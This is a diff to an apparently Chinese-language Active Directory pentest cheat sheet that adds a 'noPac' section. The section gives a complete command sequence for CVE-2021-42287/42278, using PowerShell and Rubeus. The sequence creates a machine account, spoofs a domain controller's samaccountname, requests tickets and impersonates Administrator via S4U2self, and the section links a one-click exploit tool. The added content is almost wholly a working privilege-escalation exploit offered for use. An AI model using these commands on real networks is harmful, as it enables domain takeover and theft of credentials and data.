@@ -138,6 +138,7 @@ Table of Contents
             * [Kerberos委派](#kerberos委派)
             * [地址解析协议](#地址解析协议)
             * [Zerologon](#ZeroLogon)
+            * [noPac](#nopac)
         * [获取AD哈希](#获取ad哈希)
         * [AD持久化](#ad持久化)
             * [活动目录持久性技巧](#活动目录持久性技巧)
@@ -1556,6 +1557,34 @@ secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
 ```
 然后恢复。
 ​    
+##### noPac
+漏洞分析：[CVE-2021-42287/CVE-2021-42278 Weaponisation](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
+
+Exploit：
+```
+# Create Machine Account
+New-MachineAccount -MachineAccount TestSPN -Domain internal.zeroday.lab -DomainController idc1.internal.zeroday.lab -Verbose
+
+# Clear SPNs
+Set-DomainObject "CN=TestSPN,CN=Computers,DC=internal,DC=zeroday,DC=lab" -Clear 'serviceprincipalname' -Verbose
+
+# Change Machine Account samaccountname
+Set-MachineAccountAttribute -MachineAccount TestSPN -Value "IDC1" -Attribute samaccountname -Verbose
+
+# Request TGT
+.\Rubeus.exe asktgt /user:IDC1 /password:Password1 /domain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /nowrap
+
+# Change Machine Account samaccountname
+Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname -Verbose
+
+# Request S4U2self
+.\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:idc1.internal.zeroday.lab /self /altservice:LDAP/IDC1.internal.zeroday.lab /ptt /ticket:[TGT]
+
+```
+
+一键利用：[noPac](https://github.com/cube0x0/noPac)
+
+
 #### 获取AD哈希 
 * 使用VSS卷影副本 
 * Ntdsutil中获取NTDS.DIT​​文件 
